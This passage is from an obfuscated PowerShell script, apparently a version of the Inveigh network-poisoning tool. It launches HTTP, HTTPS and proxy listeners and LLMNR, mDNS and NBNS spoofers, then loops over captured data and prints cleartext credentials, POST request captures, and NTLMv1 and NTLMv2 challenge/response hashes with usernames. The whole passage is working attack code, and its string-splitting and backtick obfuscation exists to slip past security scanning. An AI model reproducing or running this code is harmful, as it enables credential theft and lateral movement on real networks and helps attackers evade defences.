    ${contrO`l`_`R`UNspAcE}."SE`SSiOnStAt`Epr`OXy".("{2}{0}{1}"-f'etVariab','le','S').Invoke(("{1}{2}{0}" -f'igh','in','ve'),${IN`VeI`gh})
    ${C`onTrol_`PowERsHE`ll} =   ${H6`L5}::("{0}{1}"-f 'Cr','eate').Invoke()
    ${CO`NTrOL`_`POw`ers`He`LL}."RuNsp`ACe" = ${ConTR`o`l_r`Un`S`PaCe}
    ${cOntr`Ol_P`O`WEr`shELl}.("{1}{2}{0}" -f'ipt','A','ddScr').Invoke(${Sh`Ar`ED_BA`S`Ic_f`UnC`Ti`ons_Sc`RIP`T`BlOcK}) > ${nu`lL}
    ${c`OntR`Ol_Po`WErS`helL}.("{1}{0}{2}"-f'dScrip','Ad','t').Invoke(${c`oNtro`l_sCr`IPTB`loCK}).("{2}{1}{0}" -f 'rgument','A','Add').Invoke(${cON`sole`qUeUElI`MIT}).("{0}{2}{1}"-f'Ad','Argument','d').Invoke(
        ${N`BnsBru`TEFORCEp`AUse}).("{0}{3}{1}{2}" -f'Add','me','nt','Argu').Invoke(${R`Un`CoUNt}).("{3}{2}{1}{0}" -f'ent','um','Arg','Add').Invoke(${rUNt`iMe}) > ${Nu`LL}
    ${CO`NT`R`Ol_po`WeRShelL}.("{2}{0}{1}" -f 'nIn','voke','Begi').Invoke() > ${Nu`ll}
}






if(${HT`Tp} -eq 'Y')
{
    &("{2}{0}{3}{1}"-f'L','r','HTTP','istene')
}


if(${Ht`T`pS} -eq 'Y')
{
    &("{1}{0}{2}"-f'PSListene','HTT','r')
}


if(${PR`o`xY} -eq 'Y')
{
    &("{1}{2}{0}"-f'istener','P','roxyL')
}


if((${L`l`MNr} -eq 'Y' -or ${m`dNs} -eq 'Y' -or ${NB`NS} -eq 'Y' -or ${S`Mb} -eq 'Y' -or ${inspe`cT}) -and ${E`lEvAted_pRI`Vi`LeGe})
{ 
    &("{1}{2}{4}{0}{3}"-f'o','Sniff','erS','ofer','p')
}
elseif((${l`lM`Nr} -eq 'Y' -or ${m`DNs} -eq 'Y' -or ${nB`NS} -eq 'Y' -or ${s`Mb} -eq 'Y') -and !${e`levAted_PrI`VIL`E`ge})
{

    if(${l`L`Mnr} -eq 'Y')
    {
        &("{1}{2}{0}" -f'RSpoofer','LLM','N')
    }

    if(${M`Dns} -eq 'Y')
    {
        &("{2}{0}{1}"-f'NSSp','oofer','mD')
    }

    if(${NB`Ns} -eq 'Y')
    {
        &("{1}{2}{0}"-f'NSSpoofer','N','B')
    }

    if(${NB`N`sBRUTefORCE} -eq 'Y')
    {
        &("{1}{3}{0}{2}" -f'teForc','NBN','eSpoofer','SBru')
    }

}


if(${nbNsBr`UtE`F`OR`Ce} -eq 'Y')
{
    &("{2}{3}{0}{4}{1}" -f'ForceSp','fer','NB','NSBrute','oo')
}


if(${C`ONso`LEQueueL`iMIt} -ge 0 -or ${INvE`i`gH}."fI`lE`_OUTpuT" -or ${NbnSbrU`TEFor`cEP`AUse} -or ${Ru`Nc`o`UNt} -or ${Ru`N`TIME})
{
    &("{1}{3}{2}{0}"-f'op','Con','olLo','tr')
}


try
{

    if(${i`NveIgH}."consOLe`_o`U`TPuT")
    {

        if(${Co`Ns`oleSTAtUS})
        {    
            ${COn`sole`_S`Tat`US`_T`IM`EOUt} = &("{2}{1}{0}"-f'n','-TimeSpa','New') -Minutes ${cO`NS`Ol`esTaT`US}
            ${cONSoLe`_STatU`S`_`StOpW`ATcH} =  (gEt-vaRiAbLe  ('c'+'w5')  -vAlu)::("{1}{0}"-f'tartNew','S').Invoke()
        }

        :console_loop while((${IN`VE`igh}."R`UnNING" -and ${INV`E`IGH}."cOnS`OL`e`_O`UtPUt") -or (${I`N`VEIGh}."cONso`Le_qu`eue"."CO`Unt" -gt 0 -and ${INVE`i`GH}."conSO`l`E_O`UTp`UT"))
        {
    
            while(${I`NV`eIGH}."cONsO`lE_Q`Ue`UE"."C`oUNt" -gt 0)
            {

                switch -wildcard (${INv`E`igH}."C`OnsoLE_QUe`Ue"[0])
                {

                    {${_} -like ("{1}{0}{3}{2}"-f 'ten ','* writ','*','to ') -or ${_} -like ("{1}{0}{2}" -f 'for','* ',' relay *') -or ${_} -like ("{0}{3}{2}{1}"-f '*SMB ','y *','la','re') -or ${_} -like ("{3}{1}{0}{4}{2}" -f'l a','ca','istrator *','* lo','dmin')}
                    {

                        if(${IN`VE`igh}."out`Put_S`Tr`eAM_o`N`Ly")
                        {
                            &("{2}{0}{3}{1}"-f'-O','ut','Write','utp')(${iNVE`IGH}."co`N`SOL`e_quEUe"[0] + ${inVE`I`Gh}."nEw`lINE")
                        }
                        else
                        {
                            &("{1}{2}{0}" -f'ning','Writ','e-War')(${I`NvEigH}."Con`SOLE_`Qu`Eue"[0])
                        }

                        ${INv`E`igH}."c`On`S`OLE_QUeue".("{1}{0}"-f'veAt','Remo').Invoke(0)
                    }

                    {${_} -like ("{4}{0}{2}{1}{3}" -f ' spoofer ','sabl','is di','ed','*') -or ${_} -like ("{3}{0}{1}{2}"-f 'l','ocal r','equest','* ') -or ${_} -like ("{1}{0}{2}" -f 'ost h','* h','eader *') -or ${_} -like ("{2}{3}{0}{1}{4}"-f ' r','ec','* user a','gent','eived *')}
                    {

                        if(${CO`NSolEO`Ut`pUt} -eq 'Y')
                        {

                            if(${iNVe`iGH}."OuT`PuT_`Str`eaM_oNly")
                            {
                                &("{1}{2}{3}{0}"-f't','Writ','e-Ou','tpu')(${iN`V`EiGh}."con`sOLe_`Q`UeUe"[0] + ${iN`V`EiGh}."new`LiNe")
                            }
                            else
                            {
                                &("{1}{0}{2}{3}"-f'-','Write','Out','put')(${Inv`eIgh}."CoNSOLe_Qu`e`UE"[0])
                            }

                        }

                        ${inv`e`iGh}."cO`NSole`_`QueuE".("{2}{1}{0}"-f 't','eA','Remov').Invoke(0)

                    } 

                    {${_} -like ("{4}{0}{2}{3}{1}" -f ' respo','ent','n','se s','*') -or ${_} -like ("{0}{1}{2}"-f '* ignor','ing',' *') -or ${_} -like ("{3}{0}{4}{5}{1}{2}"-f'TT','uest fo','r *','* H','P*re','q') -or ${_} -like ("{1}{2}{3}{0}"-f'*','* Proxy request',' ','for ')}
                    {
                    
                        if(${COnSol`eOutP`UT} -ne "Low")
                        {

                            if(${in`V`EIgh}."oU`T`PUt`_st`ReAm_o`Nly")
                            {
                                &("{1}{3}{2}{0}"-f 'tput','Wri','Ou','te-')(${In`VeIgh}."C`onsoL`e_qUeuE"[0] + ${inv`E`iGh}."ne`wLI`Ne")
                            }
                            else
                            {
                                &("{2}{3}{1}{0}"-f'tput','te-Ou','W','ri')(${iN`VEIGH}."coN`S`ole_`QUE`UE"[0])
                            }

                        }

                        ${InV`Eigh}."coNs`OLE_`QUEuE".("{1}{0}" -f 'moveAt','Re').Invoke(0)

                    } 

                    ("{2}{1}{0}"-f 't','efaul','d')
                    {

                        if(${InvE`I`GH}."OuTput`_sT`R`eAM_ONlY")
                        {
                            &("{0}{1}{2}{3}" -f 'Wr','ite','-Outpu','t')(${InV`e`iGH}."co`NSO`lE_QUe`Ue"[0] + ${i`N`VeIgh}."nEWL`I`Ne")
                        }
                        else
                        {
                            &("{2}{0}{3}{1}" -f'rite-Out','t','W','pu')(${iN`Ve`iGH}."ConSoL`E_QuE`UE"[0])
                        }

                        ${In`V`EIgh}."CONso`LE_q`UEue".("{0}{1}{2}" -f 'Re','moveA','t').Invoke(0)
                    }

                }

            }

            if(${Co`NsO`L`es`TaTuS} -and ${c`O`N`sOLe_`s`TAt`US`_StoPwATcH}."e`LAPSED" -ge ${c`oNsOl`E_ST`ATU`s_tImeoUT})
            {
            
                if(${i`N`Veigh}."c`LeArTeXT`_`lIST"."cOu`Nt" -gt 0)
                {
                    &("{2}{0}{1}" -f 'Out','put','Write-')(("$(Get-Date -format 's') - Current unique cleartext captures: ") + ${I`NvEigH}."N`ew`LiNe")
                    ${In`VeIgH}."CL`EArTEX`T_list".("{1}{0}" -f 'rt','So').Invoke()

                    foreach(${u`NIQu`e_c`Lear`TeXT} in ${invEI`Gh}."ClEar`TeXT_`l`isT")
                    {
                        if(${uNIQ`Ue_C`lE`ARTe`XT} -ne ${uNiQUe_Cl`E`ArT`Ex`T_LaSt})
                        {
                            &("{0}{1}{2}"-f'Writ','e-Outpu','t')(${U`NiqUE_`c`lEArTExt} + ${i`NVe`IgH}."N`ew`lINE")
                        }

                        ${u`NI`quE_`cle`A`R`TExt_Last} = ${U`NiQ`Ue_cLeA`RtExt}
                    }

                    &("{0}{2}{1}" -f 'Start-','ep','Sle') -m 5
                }
                else
                {
                    &("{2}{0}{1}" -f 'te-','Output','Wri')(("$(Get-Date -format 's') - No cleartext credentials have been captured ") + ${i`NV`EiGh}."ne`WLinE")
                }

                if(${in`V`EiGh}."pOST_r`EqU`E`St_l`IsT"."Co`Unt" -gt 0)
                {
                    &("{2}{1}{0}"-f 'put','ite-Out','Wr')(("$(Get-Date -format 's') - Current unique POST request captures: ") + ${I`Nv`eIGH}."Ne`WlinE")
                    ${I`NVe`iGH}."P`Os`T_reQUe`s`T_LISt".("{1}{0}"-f 'rt','So').Invoke()

                    foreach(${UNiquE_`po`s`T_`R`EqueSt} in ${INVE`i`GH}."P`oST_reqU`Es`T`_LIst")
                    {
                        if(${Un`i`qUe_Po`St_R`EqUESt} -ne ${u`NIQU`E_Post_R`e`QUe`sT_l`Ast})
                        {
                            &("{3}{1}{0}{2}"-f 'Outp','e-','ut','Writ')(${UNiqu`e_Pos`T_R`eQUEst} + ${inV`E`igh}."n`EwLINe")
                        }

                        ${uN`IQUe_POst`_requE`st_La`st} = ${Un`I`qUE_`pOSt_RE`Qu`esT}
                    }

                    &("{2}{0}{1}"-f'rt','-Sleep','Sta') -m 5
                }
            
                if(${I`NVe`IGh}."NTL`m`V1_lIST"."CO`UNt" -gt 0)
                {
                    &("{3}{2}{1}{0}" -f'tput','e-Ou','rit','W')(("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures: ") + ${InV`e`Igh}."neW`LInE")
                    ${i`N`VEIgh}."n`TLmv`1_LISt".("{0}{1}"-f'So','rt').Invoke()

                    foreach(${u`NiqUe_nt`lMv1} in ${inVe`i`gH}."N`T`lM`V1_list")
                    {
                        ${u`NiQ`Ue_N`T`LMv`1_A`CCount} = ${u`NIq`U`e_ntLMv1}.("{1}{0}" -f'ng','SubStri').Invoke(0,${u`NI`qUe_nt`L`MV1}.("{0}{2}{1}"-f'Ind','xOf','e').Invoke(":",(${u`NIQ`UE`_nTlM`V1}.("{1}{2}{0}"-f'f','I','ndexO').Invoke(":") + 2)))

                        if(${u`N`iQUe_Nt`lMV`1_acC`Ou`Nt} -ne ${uNi`Q`Ue`_nTLmV1_A`ccoUNt`_`la`sT})
                        {
                            &("{2}{0}{1}"-f'ite-Out','put','Wr')(${Un`IqUE_N`TL`mv1} + ${inV`ei`Gh}."n`E`WlinE")
                        }

                        ${uNiqUE_NtLMv1_AC`cO`UNT_`La`sT} = ${u`NIQUE_Nt`LMV`1_`Acc`o`Unt}
                    }

                    ${un`iQu`e_NTl`M`V1_A`CcO`UnT_lASt} = ''
                    &("{3}{1}{0}{2}" -f'e','art-Sl','ep','St') -m 5
                    &("{0}{1}{2}"-f 'Write-Outp','u','t')(("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames: ") + ${I`NVEi`gH}."newl`i`NE")

                    foreach(${NTlMV1_us`e`RnAMe} in ${iNVeI`GH}."nTlM`V1_UseRn`AMe`_lIST")
                    {
                        &("{2}{1}{0}" -f'tput','Ou','Write-')(${Ntl`M`V1_`USeRName} + ${In`VE`igh}."n`ewl`INE")
                    }

                    &("{1}{2}{0}"-f 'leep','St','art-S') -m 5
                }
                else
                {
                    &("{2}{3}{0}{1}" -f'u','t','Wri','te-Outp')(("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured ") + ${iNV`Ei`gH}."NE`WlinE")
                }

                if(${i`NVeiGh}."n`TLm`V2_L`Ist"."cou`NT" -gt 0)
                {
                    &("{3}{2}{1}{0}"-f 'tput','te-Ou','i','Wr')(("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures: ") + ${I`NVei`GH}."n`EwlIne")
                    ${i`N`VEigH}."NtL`m`V2_lisT".("{1}{0}"-f't','Sor').Invoke()

                    foreach(${UNiqU`e`_`NtlMV2} in ${I`NV`EIgH}."n`TL`mv`2_LISt")
                    {
                        ${UNIqUE_N`Tlmv2`_AC`COU`NT} = ${uNiqUE_Nt`LM`V2}.("{1}{2}{0}"-f'ing','S','ubStr').Invoke(0,${un`iQue_`N`TlMV2}.("{1}{2}{0}" -f'dexOf','I','n').Invoke(":",(${UnIq`U`e_n`Tlmv2}.("{1}{0}{2}" -f'x','Inde','Of').Invoke(":") + 2)))

                        if(${U`NIqu`E`_nTLMv2_`A`cCOuNT} -ne ${uniQU`E_nTL`M`V2_aCc`Oun`T_LasT})
                        {
                            &("{1}{2}{3}{0}" -f 't','Write-O','ut','pu')(${UniQU`e_NTl`M`V2} + ${i`Nve`igH}."nEW`L`inE")
                        }

                        ${uN`IQue_NT`lMV`2_`ACcO`UnT_`lAsT} = ${UN`Iq`UE_N`TLM`V2`_`ACCOunt}
                    }

                    ${uNiQU`e_Ntlmv2_`Ac`CoU`Nt_lasT} = ''
                    &("{2}{0}{1}"-f 'tart-Slee','p','S') -m 5
                    &("{1}{0}{2}" -f '-Ou','Write','tput')(("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames: ") + ${iN`V`EigH}."nEw`Li`NE")

                    foreach(${NTL`mv2_USeR`N`AmE} in ${In`V`EIgH}."nTlMv`2_`Username_`LiSt")
                    {
                        &("{2}{1}{0}"-f 'ut','-Outp','Write')(${N`TLMV2_us`er`NAme} + ${inV`E`IGH}."n`ewliNe")
                    }
                
                }
                else
                {
                    &("{2}{1}{0}{3}"-f'-O','te','Wri','utput')(("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured ") + ${i`N`VEigH}."neW`L`INe")
                }

                ${C`OnSoLE_sT`AT`US_St`op`wA`TCh} =  ( GeT-item vARiable:Cw5)."vA`luE"::("{0}{2}{1}" -f'Sta','tNew','r').Invoke()

            }

            if(${iNv`e`iGh}."CON`SoLe_In`p`Ut")
            {

                if(  (varIABlE  ok3df  -VALUEoNLY )::"k`E`yAV`AILAble")
                {
                    ${In`Ve`igh}."CO`NsOlE_oUtp`UT" = ${FA`lsE}
                    BREAK ("{1}{0}{2}"-f'e','consol','_loop')
                }
        
            }

            &("{0}{1}{2}" -f'S','tar','t-Sleep') -m 5
        }

    }

}
finally
{

    if(${tO`Ol} -eq 2)
    {
        ${invE`IgH}."rUnN`InG" = ${f`AL`se}
    }

}

}